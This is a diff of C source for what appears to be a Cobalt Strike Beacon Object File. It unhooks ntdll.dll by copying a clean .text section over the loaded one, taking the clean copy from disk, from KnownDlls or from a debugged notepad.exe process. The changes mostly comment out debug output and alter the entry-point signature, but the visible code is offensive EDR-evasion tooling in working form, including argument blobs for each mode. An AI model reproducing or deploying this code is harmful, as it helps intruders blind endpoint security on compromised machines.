@@ -192,7 +192,7 @@ void* GetModuleAddr() {
 int* GetTextSectionInfo(LPVOID ntdll_address) {
     SIZE_T bytesRead;
     HANDLE hProcess = (HANDLE) -1;
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll_addr: \t\t0x%p\n", ntdll_address);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll_addr: \t\t0x%p\n", ntdll_address);
 
     // Read e_lfanew (4 bytes) at offset 0x3C
     DWORD e_lfanew;
@@ -402,28 +402,29 @@ void ReplaceLibrary(const char* option){
     long long unhookedNtdllTxt = 0;
     LPVOID unhookedNtdllHandle;
     const int offset_mappeddll = 4096;
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] option: \t%s\n", option);
 
     if (MyStrCmp(option, "disk") == 0) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: disk\n");
         const char* ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
         unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
         unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
     }
     else if (MyStrCmp(option, "knowndlls") == 0) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: knowndlls\n");
         unhookedNtdllHandle = MapNtdllFromKnownDlls();
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
         unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
 
     }
     else if (MyStrCmp(option, "debugproc") == 0) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: debugproc\n");
         const char* proc_path = "c:\\Windows\\System32\\notepad.exe";     
         unhookedNtdllTxt = MapNtdllFromDebugProc(proc_path);
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
     }
     else{
         return;
@@ -436,15 +437,14 @@ void ReplaceLibrary(const char* option){
     int localNtdllTxtSize = textSectionInfo[1];
     long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtBase: \t\t0x%p\n", localNtdllTxtBase);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtSize: \t\t0x%p\n", localNtdllTxtSize);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtBase: \t\t0x%p\n", localNtdllTxtBase);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtSize: \t\t0x%p\n", localNtdllTxtSize);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying %d bytes from 0x%p to 0x%p.\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);
 
     ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
 }
-
-
 //////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////
+
 
 int MyStrLen(char *str) {
     int len = 0;
@@ -565,14 +565,15 @@ void Lock(char* filename){
 }
 
 
-void go(IN PCHAR Buffer, IN ULONG Length) {
+// void go(IN PCHAR Buffer, IN ULONG Length) {
+void go(char* args, int length) {
     // Get first argument value
     //      - disk:        0e0000000a0000006400690073006b000000
     //      - knowndlls:   18000000140000006b006e006f0077006e0064006c006c0073000000
     //      - debugproc:   180000001400000064006500620075006700700072006f0063000000
     datap parser;
     wchar_t *option_w = NULL;
-    BeaconDataParse(&parser, Buffer, Length);
+    BeaconDataParse(&parser, args, length);
     option_w = (wchar_t *)BeaconDataExtract(&parser, NULL);
     HANDLE hHeap = KERNEL32$GetProcessHeap();
     char* option = "";
